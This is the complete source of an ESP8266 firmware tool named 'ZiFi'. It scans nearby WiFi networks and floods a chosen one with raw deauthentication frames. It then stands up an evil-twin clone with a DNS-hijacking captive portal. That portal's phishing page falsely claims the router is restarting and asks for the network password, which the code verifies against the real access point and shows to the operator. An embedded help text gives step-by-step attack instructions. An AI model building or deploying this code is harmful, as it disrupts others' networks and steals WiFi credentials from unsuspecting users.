#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

#define SUBTITLE "Validation Panel"
#define TITLE "Sign in:"
#define BODY "Due to internal problems router is being restarted. Enter password to re-connect to the network."
#define POST_TITLE "Validating..."
#define POST_BODY "Your account is being validated. Please, wait up to 1 minute for device connection.</br>Thank you."

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;


const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}

String _correct = "";
String _tryPassword = "";


String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><title>"+a+" :: "+t+"</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>"+CSS+"</style></head>"
    "<body><nav><b>"+a+"</b> "+SUBTITLE+"</nav><div><h1>"+t+"</h1></div><div>";
  return h; }

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' >" +
    "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Sign in\"></form></center>" + footer();
}

String posted() {
  return header(POST_TITLE) + POST_BODY + "<script> setTimeout(function(){window.location.href = '/result';}, 15000); </script>" + footer();
}

String footer() { 
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

void setup() {

  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("ZiFi", "Eviltwin");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}
void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>");
    Serial.println("Wrong password tried !");
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("ZiFi", "Eviltwin");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}

char _tempHTML[] PROGMEM = R"=====(
<html>
    <head>
        <meta name='viewport' content='initial-scale=1.0, width=device-width'>
        <title>WiFi Hacker</title>
        <style>
            body {
                background: #1a1a1a;
                color: #bfbfbf;
                font-family: sans-serif;
                margin: 0;
            }
            .content {max-width: 800px;margin: auto;}
            table {border-collapse: collapse;}
            th, td {
                padding: 10px 6px;
                text-align: left;
                border-style:solid;
                border-color: orange;
            }
            button {
                display: inline-block;
                height: 38px;
                padding: 0 20px;
                color:#fff;
                text-align: center;
                font-size: 11px;
                font-weight: 600;
                line-height: 38px;
                letter-spacing: .1rem;
                text-transform: uppercase;
                text-decoration: none;
                white-space: nowrap;
                background: #2f3136;
                border-radius: 4px;
                border: none;
                cursor: pointer;
                box-sizing: border-box;
            }
            button:hover {
                background: #42444a;
            }
            h1 {
                font-size: 1.7rem;
                margin-top: 1rem;
                background: #2f3136;
                color: #bfbfbb;
                padding: 0.2em 1em;
                border-radius: 3px;
                border-left: solid #20c20e 5px;
                font-weight: 100;
            }
        </style>
    </head>
    <body>
        <div class='content'>
        <p>
            <h1 style="border: solid #20c20e 3px; padding: 0.2em 0.2em; text-align: center; font-size: 2.5rem;">ZiFi</h1>
            <span style="color: #F04747;">INFO: </span><br>
            <span>
                - This tool will scan the network automatically for every 15 seconds. Or You can just refresh the page to scan again.<br>
                - Please select only one target!<br>
                - Next click on deauth attack, then after some time clients on that network will get starting disconnecting.<BR>
                - Now perform Evil-Twin attack, which will create the clone of the selected network.<br>
                - The web interface will be unavailable during Evil-twin attack mode, You need to reconnect.<br>
                - Reconnect after some time, it will display you the correct password in Result section.<br><br>
                Special Credits: spacehuhntech, M1z23R, 125K
            </span>
        </p><br><hr><br>
        <h1>Attack Mode</h1>
        <div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>
        <button style='display:inline-block;'{disabled}>{deauth_button}</button></form>
        <form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>
        <button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>
        </div><br><hr><br>
        <h1>Attack Panel</h1>
        <table>
            <tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>
)=====";

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("M1z23R", "deauther");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #20c20e; color:black;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop Deauth");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start Deauth");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop Evil-Twin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start Evil-Twin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table><br><hr><br>";

    if (_correct != "") {
      _html += "<h1>Results</h1></br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", posted());
    } else {
      webServer.send(200, "text/html", index());
    }
  }

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x00, 0x00, 0x01, 0x00};
    
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}
